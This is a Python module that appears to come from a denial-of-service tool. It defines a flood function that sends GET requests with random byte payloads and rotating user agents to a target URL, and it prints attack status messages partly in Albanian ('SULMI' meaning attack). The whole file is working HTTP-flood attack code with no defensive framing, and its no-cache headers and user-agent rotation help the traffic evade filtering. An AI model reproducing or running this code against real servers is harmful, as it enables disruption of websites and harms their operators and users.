
import requests
import random
import tools.randomData as randomData
from colorama import Fore


user_agents = []
for _ in range(30):
    user_agents.append(randomData.random_useragent())

headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}


def flood(target):
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.WHITE}SULMI NDALOIJ{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.MAGENTA}SULMI GET\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request Successful! Payload: {len(payload)}.{Fore.RESET}"
        )
